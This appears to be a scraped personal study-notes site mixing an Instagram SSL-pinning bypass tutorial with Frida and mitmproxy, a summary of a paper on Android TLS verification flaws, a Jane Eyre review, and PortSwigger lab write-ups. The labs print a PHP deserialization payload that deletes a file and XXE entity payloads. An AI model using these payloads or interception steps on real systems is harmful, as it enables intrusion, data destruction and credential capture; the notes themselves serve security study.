# set phone proxy $ adb shell settings put global http_proxy :0 # unset phone proxy 接下來就可以實際攔截了 Bypass SSL Pinning by Frida # 還記得之前做的實驗論文筆記中有提到，有一部分的app就算安裝了SSL Unpinning的Plugin還是無法攔截到流量，根據Defeating Android Certificate Pinning with Frida文章的說明，Facebook各式各樣的App所使用的憑證標準和實作方式都是自定義的，而不是用標準API，這樣的話用一般的SSL Unpinning就還是不會成功\nNotably some apps which will go above and beyond, by implementing their own custom certificate pinning techniques from scratch, to make disabling it as difficult as possible. The prime example of this is the various Facebook apps, which all use their own custom reimplementation of TLS rather than the standard platform APIs.\nIt\u0026rsquo;s definitely possible to automatically remove certificate pinning features from that too within the same Frida script in theory (contributions very welcome!), but it\u0026rsquo;s significantly more difficult than mocking out a well-known common library, so I haven\u0026rsquo;t done that yet, and so this script won\u0026rsquo;t work for Facebook, Facebook Messenger, Instagram, or similar.\n所以通過上述教學影片，我們可以用Frida搭配特定App的腳本去Hook特定App中的特定Function，讓我們能夠在Proxy中攔截到流量\n安裝Frida-tools和Frida-server $ conda create --name proxy python=3.11 -y $ pip install frida-tools 接著按照官網的說明安裝frida-server 先從手機看架構 以我的Google Pixel 6a來說，架構是aarch64 $ adb shell uname -a Linux localhost 5.10.157-android13-4-00001-g914e947b041d-ab10144456 #1 SMP PREEMPT Tue May 16 08:47:42 UTC 2023 aarch64 Toybox 再到github releases下載最新的server 此時我要選的版本就是frida-server-{version number}-android-arm64.xz 解壓縮後放到手機端上並且啟動這個frida-server $ mv frida-server-16.2.5-android-arm64 frida-server # rename it $ adb push frida-server /data/local/tmp/ $ adb shell \u0026#34;chmod 755 /data/local/tmp/frida-server\u0026#34; $ adb shell \u0026#34;/data/local/tmp/frida-server \u0026amp;\u0026#34; 下載Instagram的腳本 同樣根據影片教學，到Eltion/Instagram-SSL-Pinning-Bypass下載最關鍵的.js script，他裡面還有其他的App Script，包含threads和messager之類的 $ wget https://raw.githubusercontent.com/Eltion/Instagram-SSL-Pinning-Bypass/main/instagram-ssl-pinning-bypass.js 啟動Burp Suite和腳本 Run腳本之前把Instagram的App強制停止 $ frida -U -l ./instagram-ssl-pinning-bypass.js -f com.instagram.android ____ / _ | Frida 16.2.1 - A world-class dynamic instrumentation toolkit | (_| | \u0026gt; _ | Commands: /_/ |_| help -\u0026gt; Displays the help system . . . . object? -\u0026gt; Display information about \u0026#39;object\u0026#39; . . . . exit/quit -\u0026gt; Exit . . . . . . . . More info at https://frida.re/docs/home/ . . . . . . . . Connected to Pixel 6a (id=24121JEGR04513) Spawning `com.instagram.android`... [*][*] Waiting for libliger... Spawned `com.instagram.android`. Resuming main thread! [Pixel 6a::com.instagram.android ]-\u0026gt; [*][+] Hooked checkTrustedRecursive [*][+] Hooked SSLContextInit [*][+] Found libliger at: 0x76a3404000 [*][+] Hooked function: _ZN8proxygen15SSLVerification17verifyWithMetricsEbP17x509_store_ctx_stRKNSt6__ndk112basic_stringIcNS3_11char_traitsIcEENS3_9allocatorIcEEEEPNS0_31SSLFailureVerificationCallbacksEPNS0_31SSLSuccessVerificationCallbacksERKNS_15TimeUtilGenericINS3_6chrono12steady_clockEEERNS_10TraceEventE -U代表目標是USB連接的Device -l代表要運行的Script -f代表腳本的目標為何 查看Burp Suite 此時如果Burp Suite有開Intercept，並且App有送出一些東西，理論上都會被攔截到 對比 # 沒有使用Frida的時候 # 會得到以下截圖 ![Screenshot_20240523-101015](https://hackmd.io/_uploads/Bk7aFN37R.png#pic_center =200x) 並且Burp Suite沒有得到任何關於instagram的封包\n有使用Frida的時候 # 例如我在前面的登入介面輸入一些東西，可以在封包紀錄中找到我輸入的Username和Password ![Screenshot_20240523-120440](https://hackmd.io/_uploads/H1-tlBhXR.png =200x) 可以在傳輸的封包中找到這個json parameter body，而我輸入的Username: testqqqqqqwwwwww也的確在其中 { \u0026#34;client_input_params\u0026#34;: { \u0026#34;device_id\u0026#34;: \u0026#34;android-70ea1739c3d78fb5\u0026#34;, \u0026#34;login_attempt_count\u0026#34;: 1, \u0026#34;secure_family_device_id\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;machine_id\u0026#34;: \u0026#34;Zk6_IgABAAFG881bw25QVFTkQhJH\u0026#34;, \u0026#34;accounts_list\u0026#34;: [], \u0026#34;auth_secure_device_id\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;has_whatsapp_installed\u0026#34;: 0, \u0026#34;password\u0026#34;: \u0026#34;#PWD_INSTAGRAM:1:1716436802:ASkUVtbquYjqR+MxW5sAAQJv9IFYeA7RM5r8OEvSkEDf6+0YsJ0oKKAkfx7o9AM5hpZW1TQV6POf1fg8uLC1E+gCgyqCwZiyCHYgqO3XDol2g2HFrwpNMwMn1S15LGjT9i8TEfh+k8hPuNFwGkEpLll6ycMur34gdx2V0vewuHlDOZapFmVetj+odQVW0u4WLwJybvKcFMdGGYWH7BqhmSsMjCFOBPzeflgf5fHQdxV14NWekpCWHED3LVwdISxa/yHvaYoc1EICz/O3wJO56aU3Y2zNQttBxKxuhCeS59sexNwaiz10hFMe9mb/0BD158z5Nn9x+3b5XDy24v3mNNHA4F6jkdiGwy8pAI0a/4X+yiOt5bVOCsinfGbso22kC6YnYq8dbBlUHD5zKTlKow8E\u0026#34;, \u0026#34;sso_token_map_json_string\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;family_device_id\u0026#34;: \u0026#34;23045e76-6a5c-4886-8eca-0936fdb5f76b\u0026#34;, \u0026#34;fb_ig_device_id\u0026#34;: [], \u0026#34;device_emails\u0026#34;: [], \u0026#34;try_num\u0026#34;: 1, \u0026#34;lois_settings\u0026#34;: { \u0026#34;lois_token\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;lara_override\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;event_flow\u0026#34;: \u0026#34;login_manual\u0026#34;, \u0026#34;event_step\u0026#34;: \u0026#34;home_page\u0026#34;, \u0026#34;headers_infra_flow_id\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;openid_tokens\u0026#34;: {}, \u0026#34;client_known_key_hash\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;contact_point\u0026#34;: \u0026#34;testqqqqqqwwwwww\u0026#34;, \u0026#34;encrypted_msisdn\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;server_params\u0026#34;: { \u0026#34;should_trigger_override_login_2fa_action\u0026#34;: 0, \u0026#34;is_from_logged_out\u0026#34;: 0, \u0026#34;should_trigger_override_login_success_action\u0026#34;: 0, \u0026#34;login_credential_type\u0026#34;: \u0026#34;none\u0026#34;, \u0026#34;server_login_source\u0026#34;: \u0026#34;login\u0026#34;, \u0026#34;waterfall_id\u0026#34;: null, \u0026#34;login_source\u0026#34;: \u0026#34;Login\u0026#34;, \u0026#34;is_platform_login\u0026#34;: 0, \u0026#34;INTERNAL__latency_qpl_marker_id\u0026#34;: 36707139, \u0026#34;offline_experiment_group\u0026#34;: null, \u0026#34;is_from_landing_page\u0026#34;: 0, \u0026#34;password_text_input_id\u0026#34;: \u0026#34;0:96\u0026#34;, \u0026#34;ar_event_source\u0026#34;: \u0026#34;login_home_page\u0026#34;, \u0026#34;username_text_input_id\u0026#34;: \u0026#34;0:95\u0026#34;, \u0026#34;layered_homepage_experiment_group\u0026#34;: null, \u0026#34;should_show_nested_nta_from_aymh\u0026#34;: 1, \u0026#34;device_id\u0026#34;: null, \u0026#34;INTERNAL__latency_qpl_instance_id\u0026#34;: 217, \u0026#34;reg_flow_source\u0026#34;: \u0026#34;cacheable_aymh_screen\u0026#34;, \u0026#34;is_caa_perf_enabled\u0026#34;: 1, \u0026#34;credential_type\u0026#34;: \u0026#34;password\u0026#34;, \u0026#34;caller\u0026#34;: \u0026#34;gslr\u0026#34;, \u0026#34;family_device_id\u0026#34;: null, \u0026#34;INTERNAL_INFRA_THEME\u0026#34;: \u0026#34;harm_f\u0026#34;, \u0026#34;is_from_logged_in_switcher\u0026#34;: 0 } } How to use mitmproxy as Proxy? # 這有點小複雜，我看網路上的教學有時候都東漏西漏，\n安裝mitmrproxy 我是直接用$ pip install mitmproxy，並且直接run起來，$ mitmweb 下載憑證 如果一開始拿到的手機就是已經Rooted，那就直接下載憑證就好，我是用電腦版下載，首先把電腦上的proxy設定起來 ![圖片](https://hackmd.io/_uploads/HJ5drE4wC.png =300x) 並且在瀏覽器上打 http://mitm.it 然後就會看到以下畫面 ![圖片](https://hackmd.io/_uploads/Bk-cINNP0.png =300x) 如果沒有先設定電腦上的proxy，他預設並不會走mitmproxy，這時候再瀏覽同一個網站就會出現以下畫面 這時我們們就可以直接選取android要得憑證 把憑證放到手機上並且依照How to Root Android Phone \u0026amp; Install AlwaysTrustUserCert.zip Module?中最後的注意事項進行安裝，也就是先把之前所有安裝的憑證刪除→重新啟動→重新安裝\u0026quot;所有\u0026quot;的憑證→重新安裝Magisk模組→Reboot，就可以了 此時檢查手機中的的Trusted credentials應該就會發現mitmproxy的憑證已經被信任 ![Screenshot_20240704-225258](https://hackmd.io/_uploads/B1v_PE4vC.png =200x) 設定手機的Proxy IP 我是直接用電腦的hot spot來測試，所以手機就填電腦IP和8080的Port 攔截流量 此時一切幾乎準備就緒，但有個小問題，如果按照前面的command，會一直出現以下問題 ![圖片](https://hackmd.io/_uploads/r1Huu44PA.png =400x) 根據Stackoverflow的說明，我們可以加上set參數 $ mitmweb --set block_global=false --set view 就可以順利攔截到流量了 Reference # 網頁安全性測試：OWASP ZAP使用入門\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":128,"href":"/survey-papers/android-+-security/identifying-vulnerabilities-of-ssl_tls-certificate-verification-in-android-apps-with-static-and-dynamic-analysis/","title":"Identifying vulnerabilities of SSL/TLS certificate verification in Android apps with static and dynamic analysis","section":"Survey Papers","content":" Identifying vulnerabilities of SSL_TLS certificate verification in Android apps with static and dynamic analysis # :::info Wang, Y., Xu, G., Liu, X., Mao, W., Si, C., Pedrycz, W., \u0026amp; Wang, W. (2020). Identifying vulnerabilities of SSL/TLS certificate verification in Android apps with static and dynamic analysis. Journal of Systems and Software, 167, 110609. ::: 這一篇論文對我要做的東西非常類似，雖然本質上不一樣但有很多的觀點以及解決方式是可以參照的\nIntroduction # 這篇文章探討了在Android應用程式中SSL/TLS憑證驗證的弱點，並提出了一種名為DCDroid的工具來偵測這些弱點。作者結合靜態和動態分析，分析了來自Google Play和360app的2213個應用程式，發現其中有20.65%可能存在弱點。透過DCDroid在兩部Android智慧手機上執行這些應用程式，最終確認了11.07%的應用程式對MITM和釣魚攻擊存在真正的弱點。\nBackground # SSL/TLS and Android 一般來說，正確的驗證憑證的步驟為\n在憑證鏈中的所有憑證有無過期 憑證或憑證鏈中的根憑證由客戶端的憑證授權單位（CA）簽署 證書中的網域名稱與所連接的伺服器的網域名稱相符 但是基於一些原因(例如: 使用self-signed certificate/伺服器的root憑證不在手機的CA list中/糾正某些第三方庫的不安全實作)導致開發者會自行實做一個憑證驗證的方法，而這時候就有可能會產生一些漏洞發生，例如: :::warning\n信任具有 X509TrustManager 介面的所有證書(有關的說明可以參考官網) HostnameVerifier 未檢查Domain Name(有關的說明可以參考官網) 使用setHostnameVerifier（透過使用ALLOW_ALL_HOSTNAME_VERIFIER）方法接受任何網域名稱(範例如證書不安全解決HttpClient 如何忽略證書驗證 - ALLOW_ALL_HOSTNAME_VERIFIER) 當WebView元件發生憑證驗證錯誤時，直接在onReceivedSslError()方法中呼叫proceed()方法可以忽略憑證驗證錯誤。 補充: 根據[Android] WebView without HTTPS 在設定 webView 的時候需要設定 WebViewClient ,這個方法是重新調整當 SslError 時的反應方法,在 Android9.0 之後 onReceivedSslError 的預設方法是handler.cancel()，如此會將 WebView 變成空白頁，將handler.cancel()改成handler.proceed() 之後就可以成功顯示沒有 SSL 的網頁 :::\nProblem Statement # 如何定義潛在的易受攻擊代碼並觸發它們 如何模擬人類操作 作者有提出很多工具，例如MonkeyRunner、Appium、FlowDroi、DroidScope、Dynodroid、Smart Droid、Brahmastra MonkeyRunner: 它的執行沒有特殊用途，主要依賴於隨機點擊。因此，很難觸發易受攻擊的代碼 Appium: 可以使用特定的腳本來精確運行 UI 元素。但是，它沒有通用性，需要針對每個應用程式進行自定義。 FlowDroi、DroidScope: 可以跟蹤方法調用關係。但是，它們無法觸發動態漏洞 Dynodroid: 專注於處理自動輸入 Smart Droid、Brahmastra: 無法處理 Web UI 如何高效運行 這個就和老師說的有關，在一個App的activity中，有很多是類似的UI elements，而這些類似的UI對應到的handler其實差不多甚至一樣，那這樣的話如果要進行測試只要測試一個就好 如何有效運行 意思是雖然proxy可以攔截所有流量，但是我們怎麼確認這個流量是來自我們要偵測的那個App所發出來的呢?背景程式中有很多其他的App也在發出package，要怎麼辨認呢? Proposed Method # 整體的分析流程如下，首先給定一個App，然後先進行靜態分析，並且分析取得的smali code，用一開始定義的演算法以及漏洞方法，找到潛在的漏洞，並且把vulnerable activity給動態分析，實際安裝與執行後，利用MITM工具攔截流量，並使用VPNService捕獲智能手機上的流量。最後，我們通過比較智慧手機和攻擊工具之間的流量來確認那些真正易受攻擊的應用程式。 '\n如何定義潛在的易受攻擊代碼並觸發它們 # 如何定義vulnerable method # X509TrustManager: 如果開發者有擴充這個class，他就會實際的看==checkClientTrusted==和==checkServerTrusted==這兩個method，如果這兩個method只有return void這一行code，那就代表這個App信任具有X509TrustManager 介面的所有證書，那當然就是有問題的地方 HostNameVerifier: 先檢查HostNameVerifier有沒有被實作，如果有就往下檢查==verify== method，他直接查看這個方法如果第一行是const開頭，第二行直接return的話，就代表他沒有檢查Domain Name，也一樣是有問題的 X509HostnameVerifier: 先檢查X509TrustManager extend class的類別中是否有sget-object的指令。如果有，我們檢查它是否以 ==ALLOW_ALL_HOSTNAME_VERIFIER Lorg/apache/http/conn/ssl/X509Hostname Verifier== 結尾。如果還是成立，我們檢查下一指令是否為 ==-\u0026gt; setHostname Verifier (Lorg/apache/ http/n/ssl/X509Hostname Verifier);V== 。如果存在，我們就認為該方法有漏洞。 WebViewClient sslError: 先檢查程式有無擴充WebVieClient這個class，如果有就檢查==onReceivedSslError==這個方法，如果這個method只有兩個instructions，而且第一行是invoke-virtual開頭、Landroid/webkit/SslErrorHandler;-\u0026gt;proceed()V結尾，另外第二行就直接return void的話，代表這個method是有問題的 如何判斷這些vulnerable method會被觸發 # Vulnerable Method最後會被誰call到 這段演算法的目的是通過遍歷Method Call Graph，找到所有可能調用Vulnerable Method的入口點方法，這些入口點方法是應用啟動時首先執行的方法或初始化方法。這樣可以幫助開發者了解潛在的Vulnerable Method是如何被call的，在動態分析階段優先考慮這些entry point，以便執行它們。這個演算法的概念是，從vulnerable method的角度出發一直往上走(看誰有call到)，比方說A call B, B call C, C call vulnerable method v1，而因為A是最後一個和VM有關係的class，那就直接看A裡面的constructor，並且向剛剛一樣，不斷往上看誰call了這個class method，找到最後，如果有一個class constructor是沒有被app任何一個code所呼叫，代表他一定是被系統所呼叫，這樣的話這個constructor就是我們要找的entry point 演算法: Require: MCG : Method Call Graph,VM : Vulnerable Method Ensure: Result : Set of Entry Point Methods function FindFinalCaller ( MCG, VM ) if method_callers of VM not null then for each method_caller in method_callers do FindFinalCaller(MCG, method_caller) end for else for each method in class(method_callers) do if method is class\u0026#39; constructor and method is not in Result then Result.append(method) FindFinalCaller (MCG, method) else method is in Result return end if end for end if end function 取得Entry Activity: 建立Activity Call Graph(ACG) 這個psuedo code的主要目的是構建一個Activity Call Graph，識別從任意Activity到包含潛在Vulnerable View的Activity的所有可能路徑。這對於安全分析和優化應用程序的設計非常有用。通過這樣的Call Graph，開發者可以清晰地了解應用程序的Activity之間的跳轉關系，尤其是涉及到Vulnerable View的路徑，從而有針對性地進行安全防護和性能優化。一些複雜的事件（如Swipe和長按）會被忽略，因為它們不太可能觸發 HTTPS 連接 演算法: Input: AndroidManifest.xml potientalVulnerableViews Output: ActivityCallGraph(ACG) function BuildACG(potientalVulnerableViews, AndroidManifest.xml) ACG = φ for each views in potientalVulnerableViews do EntryActivity = findActivityByViewID(views.getId) ActivitySet = initActivity(AndroidManifest.xml) ACG = Fun(EntryActivity, AvtivitySet, ACG) end for return ACG end function function Fun(EntryActivity, AtivitySet, ACG) for each activity in ActivitySet do if activity == MainActivity then return ACG end if if activity jump to EntryActivity By method.Event(such as Button.click) then ACG ∪ (activity → EntryActivity) fun(activity, ActivitySet, ACG) end if end for endfunction 如何模擬人類操作 # UI自動化元件有三個任務:\n取得UI元素並操作它們 減少UI元素並確定優先級 運行App並管理UI狀態 當應用程式進入一個Activity時，需要取得該Activity的每一個元素，並提取該元素的屬性，例如按鈕的文字、文字方塊的輸入形式等。根據所獲得的信息，系統創建適當的事件來操作元素，以便Activity可以正常地從一個元素跳到另一個元素。例如，為複選框建立選擇事件，為文字方塊建立輸入事件。為了實現這個目標，我們使用AndroidViewClient來管理元件。它可以取得UI元素，為UI元素建立適當的事件並執行特定應用程式的動態操作\n如何高效運行-加速 # 為了避免相似的view重複被執行，所以用了另外一個演算法找出類似的view，以及最多只取前四個 如果一個元件繼承自同一個父元件，並且具有相同的屬性（例如相同的大小、顏色等），那麼我們就認為它們是相同的\nRequire: Views Ensure: Set of Vulnerable Views function SimilarViewsFinder (Views) for each view in Views do viewSize=view.getSize(); if viewSize in viewWithSameParentAndSize then viewWithSameParentAndSize[viewSize].append(view); else for each exitView in viewWithSameParentAndSize do if difference (exitView, view ) \u0026lt; threshold then viewWithSameParentAndSize[exitView].append(view); else viewWithSameParentAndSize[view].append(view); end if end for end if end for for key in viewWithSameParentAndSize.keys do if len (viewWithSameParentAndSize [ key ]) \u0026lt; 4 then potientalVulnerableViews[key].append(viewWithSameParentAndSize[key]); else potientalVulnerableViews[key].append(viewWithSameParentAndSize[key][1.4]); end if end for return potientalVulnerableViews end function 如何有效運行 # 這就回到一開始的問題，要如何保證proxy所攔截到的流量是我們正在測試的App所發出去的，作者使用Android內建的VPNService解決這個問題 App透過socket把資料送到NIC(network interface card，網卡) NIC把所有的packet都送到虛擬網卡(Virtual NIC) VPN打開/dev/tun並且讀取裡面的data，此時data可以儲存或是改變 最後，VPN將資料發送到NIC。VPN應用使用的socket必須顯式綁定到NIC，以避免data packet的無限迴圈 方法是讀取/proc/net/tcp和/proc/net/tcp6檔案來取得PID的IP及其URL。使用UsageStatsManager class可以取得目前正在執行的應用程式的PID。 PackageManager class可以取得PID和app之間的對應關係。這樣我們就可以得到每個HTTPS流量和應用程式之間的對應關係。透過比較智慧型手機和MITM攻擊工具所獲得的HTTPS流量，可以確認存在漏洞的應用程式。我們開發了一款Android流量抓取工具來實現這個功能。\nExperiment # Dataset # 從360app和google play商店中分別於2018/12以及2016/06取得1253 apps和960 apps，特別說明，他們把超過100M的app刪除，因為大部分這些app都是複雜的遊戲程式，在動態測試時會頻繁的crash Static Analysis # :::warning 這個table在設計上有誤，他把360app和google play下面的底線標錯了，360app應該是包含前面的count和他底下的percentage，而圖片上包含的count是屬於google play，至於google paly包含的count則是360app和google play兩者相加的結果 ::: 靜態分析的結果如下，總共有30/2213(1.36%)的App無法disassembly，並且有 457 個 （20.65%） 應用程式具有潛在的易受攻擊代碼，這些應用程式被認為具有潛在的證書驗證漏洞。 作者把以上的結果和之前的工具AndroBugs, kingkong and appscan進行比較，結果如下，AndroBugs 在靜態檢測的檢測精度方面略優於DCDroid。但是，在沒有動態檢測的情況下，它會生成大量誤報。至於kingkong和appscan，DCDroid在靜態檢測的檢測精度方面更好。此外，他們無法檢測到 HostNameVerifier 漏洞。這兩個工具還包含許多誤報。因此，DCDroid 在靜態檢測階段並不是最好的。但是，DCDroid 的主要優點是我們可以動態運行應用程式並刪除誤報 ![圖片](https://hackmd.io/_uploads/H1Rm6_prA.png =600x)\nDynamic Analysis # 在動態分析中，我們使用AndroidViewClient操作兩部 Android 智慧手機並運行應用程式。平均而言，每個應用程序花費 183 秒。動態檢測結果如表1所示。可以看出，來自 360app 和 Google Play 的 245 個應用被識別為存在證書驗證漏洞，占潛在漏洞代碼的 53.61%，佔所有應用的 11.07%。這表明我們數據集中有 11.07% 的應用存在證書驗證漏洞。從表中可以看出，360app中的證書驗證漏洞佔比為12.05%，Google Play中的證書驗證漏洞佔比為9.79%。360app中的易受攻擊的應用程式比Google Play中的應用程式更多。 ![圖片](https://hackmd.io/_uploads/Sk8aK_TSA.png =600x)\nDiscusion # DCDroid這套工具是有效地，但仍存在局線性 在靜態分析中，判斷是vulnerable method的方式比較簡單粗暴，但是搞不好其實那些有複雜實作的method到最後也沒有安全的進行驗證工作，但這類的app，dcdroid是沒辦法分析出來的 在動態測試中，為了加速而把一些相似的view捨棄，但不能保證false negative的數量有多少 "},{"id":129,"href":"/books-notes/jane-eyre-%E7%B0%A1%E6%84%9B/","title":"Jane Eyre (簡愛)","section":"Books Notes","content":" Jane Eyre (簡愛) # 中文譯本 崇文館 2000 ![91zU70Aw9IS.AC_UF1000,1000_QL80](https://hackmd.io/_uploads/S1iaQyPakx.jpg =200x)\n:::spoiler 讀的過程中條列的重點\n用階級交易自由到底划不划算? 簡愛離開會家暴自己的家庭(有毒的家庭要如何和解，從ch20~ch22有提到)，到一個慈善學校，但挨餓受凍\n海倫(簡愛小時候的同學)很奴，很那個年代的思考邏輯(用聖經寬恕別人的惡)，但他已經沒有任何階級可以交換了，難不成要他變成乞丐，就為了逃避看自己不爽的老師?\n目前看到現在，這本書是在講什麼時候該忍耐，什麼時候該反擊，以及各種決定下的後果\n荒唐的教育體制，無法容忍一絲一毫的缺點，荒謬的命令，猶如軍營的紀律\n到第十章在講從家庭到學校的過程，之後就是講述接到家庭教師工作的故事\n目前看到的重點應該會集中在第14章，男主人是一個非常怪的人，會問一些超怪的問題，但也有可能是要夾帶一些觀念，或是之後鋪陳的資訊\nP.148有一個有趣的段落，我不確定原文是不是也是這個意思，但我解讀出兩種可能，阿黛拉是無父無母的小孩這句話\n代表簡愛不認為阿黛拉的生父是羅撤斯特\n代表簡愛認為阿黛拉的生父即使是羅撤斯特，但也沒有得到他的愛\n男女主角感覺很像現代的霸道總裁\n這根本是一部披著愛情的推理解謎，至少寫法有點像，總是會先丟一些不知所云的懸念和線索，可能快則下一章，慢則十章後就會解答當初的台詞、情境以及行為\n這一套翻譯讓我看了覺得尷尬，想像的畫面不是超級八點檔就是類似誇張的舞台劇，而且台詞支離破碎\n整篇文章充斥著女主角簡愛對於自由的渴望，用了非常非常多的\u0026quot;我有權決定\u0026hellip;\u0026quot;，並且時常打破傳統的思維，某種層面和我自己蠻像的，簡單講就是反骨\n女主的性格就是一個非常理性的人，別人想用詩意打動人心，他會分析其中不合理的舉止和批判試圖囚禁自由的說詞\n第25章還蠻重要的，又是一大段的鋪陳和懸念 :::\n總結 # 這部小說探討了自由與階級的交換是否值得，透過簡愛的經歷，展現了她如何從家暴的家庭逃離，進入慈善學校，卻又面臨饑寒交迫的困境（ch20~ch22也提到了如何與有毒家庭和解）。\n書中的海倫(簡愛小時候的同學)則代表了一種極端的忍耐與順從，她遵循聖經的教誨寬恕一切，然而她已無階級可交換，難道真的只能淪為乞丐，來逃避不公的處境？這也延伸出小說的核心主題之一：何時應該忍耐，何時應該反擊，並承擔不同選擇的後果。\n從前面的離家到後面的毅然決然離開羅撤斯特，都在在表示簡愛面對抉擇時，不會猶豫不決並且遵從內心，嚮往毫無瑕疵的靈魂又或者說是不受委屈且自由的未來，縱使劇情放到現在依然瓊瑤感滿滿，也渲染鄉土八點檔特色，但提點女性甚或是任何人必須要遵從內心(在書中可能類似上帝之音等等指引)，選擇不會後悔的未來這件事情還是極具意義，從敘事文筆以及情節編排上，我認為都蠻值得學習，男女主角的相處模式有些像現代的「霸道總裁」情節，而整體寫作風格更接近解謎小說，每閱讀一個章節，就是埋下一些懸念和鋪陳的味道，並且同時回收前面那些一時無法明白的橋段，雖然不難猜，但手法很流暢，在文筆上也不拖泥帶水，非常適合暈船仔看。 從頭到尾，簡愛對自由的渴望貫穿全文，頻繁強調「我有權決定……」，並不斷挑戰傳統思維。某種程度上，她的個性與我的思維方式相似，都帶著一點反骨。她的理性思維使她拒絕詩意的修辭，並冷靜分析那些試圖限制她自由的言論。\n章節編排和重點 # 小說對當時荒唐的教育體制提出批判，要求學生毫無缺陷、服從如軍營般的紀律。第10章描述了簡愛從家庭到學校的轉變，接著便進入她成為家庭教師的故事。而第14章開始，男主角羅徹斯特登場，他行為古怪，發問方式異常，可能是在傳遞特定觀念，或為後續劇情埋下伏筆。第25章是個關鍵轉折點，又埋下了大量伏筆與懸念，預示著後續劇情的重要發展。第30章就大概是離開桑費德並且和堂兄姐妹團聚的橋段\n缺點 # 這本翻譯小說的表達方式讓人感到尷尬，對話時而像八點檔，時而像誇張的舞台劇，台詞也顯得零碎不連貫。簡愛的堂哥聖約翰真的很討厭，完全把自己奉獻給上帝就算了，還要一個工具人老婆，還給我情勒和PUA，這也是這部小說我沒那麼喜歡的地方，凡是牽扯上帝，宗教色彩非常濃厚，在前半端(也就是大約30章以前)還可以說上帝云云放到現在應該隱喻任何困難或是自己的內心等等，但後半段真的就是那個年代會有的思想，包含為了上帝\u0026hellip;或是為他工作\u0026hellip;，總之價值觀在後半段就是不合時宜\n有趣的部分 # 在P.148，阿黛拉「無父無母」的設定耐人尋味，可能暗示簡愛認為：\n羅徹斯特不是阿黛拉的生父。 即使他是生父，也從未給予阿黛拉父愛。 "},{"id":130,"href":"/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/","title":"Lab: Arbitrary object injection in PHP","section":"Securities","content":" Lab: Arbitrary object injection in PHP # tags: Portswigger Web Security Academy Web # Description: This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. Goal: To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos\u0026rsquo;s home directory. You will need to obtain source code access to solve this lab. You can log in to your own account using the following credentials: wiener:peter Hint: You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file. Constructor \u0026amp; Deconstructor # Python建構函式與解構函式（init()和__del__()） 其實概念就是Python的__init()__ function，在instanciate一個class的時候扮演初始化的功能而已 而deconstructor就是Python中的__del__() function用來回收不需要的class，以達到降低記憶體的使用量\nRecon # Login and Recon As the solution of this lab, we first need to arbitrary query something in this website, e.g. query My account and forward all packages\nUse Target Feature in Burp Suite In my case, the URL of this lab is https://0a29005704ba2655802d8a75009100d5.web-security-academy.net/my-account?id=wiener\nSo, I can search it in target feature to browse all query of this website. 通靈Something Interesting - /libs/CustomTemplate.php This file may be a vulnerability to achieve our goal.\nSend to repeater Obviously, you can not access the content first. By the hint. The solution is using ~ character to read the source code :::spoiler CustomTemplate.php Source Code\n\u0026lt;?php class CustomTemplate { private $template_file_path; private $lock_file_path; public function __construct($template_file_path) { $this-\u0026gt;template_file_path = $template_file_path; $this-\u0026gt;lock_file_path = $template_file_path . \u0026#34;.lock\u0026#34;; } private function isTemplateLocked() { return file_exists($this-\u0026gt;lock_file_path); } public function getTemplate() { return file_get_contents($this-\u0026gt;template_file_path); } public function saveTemplate($template) { if (!isTemplateLocked()) { if (file_put_contents($this-\u0026gt;lock_file_path, \u0026#34;\u0026#34;) === false) { throw new Exception(\u0026#34;Could not write to \u0026#34; . $this-\u0026gt;lock_file_path); } if (file_put_contents($this-\u0026gt;template_file_path, $template) === false) { throw new Exception(\u0026#34;Could not write to \u0026#34; . $this-\u0026gt;template_file_path); } } } function __destruct() { // Carlos thought this would be a good idea if (file_exists($this-\u0026gt;lock_file_path)) { unlink($this-\u0026gt;lock_file_path); } } } ?\u0026gt; :::\nIn this example, we notice that it has constructor and deconstructor so we can constuct a serialization string to delete something\nExp - Deconstructor # Exploit Payload:\nO:14:\u0026#34;CustomTemplate\u0026#34;:1:{s:14:\u0026#34;lock_file_path\u0026#34;;s:23:\u0026#34;/home/carlos/morale.txt\u0026#34;;} Then send it directly and we can delete the specific file properly. :::spoiler Success Screenshot :::\n"},{"id":131,"href":"/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction/","title":"Lab: Blind XXE with out-of-band interaction","section":"Securities","content":" Lab: Blind XXE with out-of-band interaction # tags: Portswigger Web Security Academy Web # Description: This lab has a \u0026ldquo;Check stock\u0026rdquo; feature that parses XML input but does not display the result. You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain. Goal: To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. Hint: Background # 有兩種廣泛的方法可以找到和利用Blind XXE 漏洞：\n您可以觸發out-of-band網絡交互，有時會在交互數據中泄露敏感數據。 您可以通過錯誤消息包含敏感數據的方式觸發 XML 解析錯誤。\nRecon # Declare a new entity and reference it :::spoiler Payload\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY xxe \u0026#34;test\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;stockCheck\u0026gt; \u0026lt;productId\u0026gt; 1 \u0026lt;/productId\u0026gt; \u0026lt;storeId\u0026gt; 1 \u0026lt;/storeId\u0026gt; \u0026lt;/stockCheck\u0026gt; ::: As the result above, it seems can accept a new entity, then we can use it in xml\n:::spoiler Payload\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY xxe \u0026#34;test\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;stockCheck\u0026gt; \u0026lt;productId\u0026gt; \u0026amp;xxe; \u0026lt;/productId\u0026gt; \u0026lt;storeId\u0026gt; 1 \u0026lt;/storeId\u0026gt; 